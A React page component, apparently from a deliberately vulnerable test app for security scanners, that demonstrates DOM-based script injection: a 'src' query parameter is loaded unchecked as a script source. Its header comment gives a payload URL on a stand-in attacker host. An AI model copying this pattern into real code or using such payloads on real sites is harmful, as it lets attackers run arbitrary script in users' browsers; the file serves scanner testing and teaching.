/**
 * Vulnerability: Remote Script Injection via dynamic script.src
 * Source: URLSearchParams('src')
 * Sink: createElement('script').src = src
 * SAST Rules: Semgrep script-src-injection
 * BApp Store: JavaScript Security (Cross-Domain Script Includes) https://portswigger.net/bappstore/22d5448831184ac3a94d0a112d744069
 * Payload: ?src=https://evil.example.com/malicious.js
 */
export default function ScriptInjectionPage() {
  return (
    <div>
      <h1>動的 script.src インジェクションデモ</h1>
      <script
        dangerouslySetInnerHTML={{
          __html: `
        // VULNERABLE: URLSearchParams flows directly to script.src
        var params = new URLSearchParams(location.search);
        var src = params.get('src');
        if (src) {
          var s = document.createElement('script');
          s.src = src;
          document.body.appendChild(s);
        }
      `,
        }}
      />
    </div>
  );
}
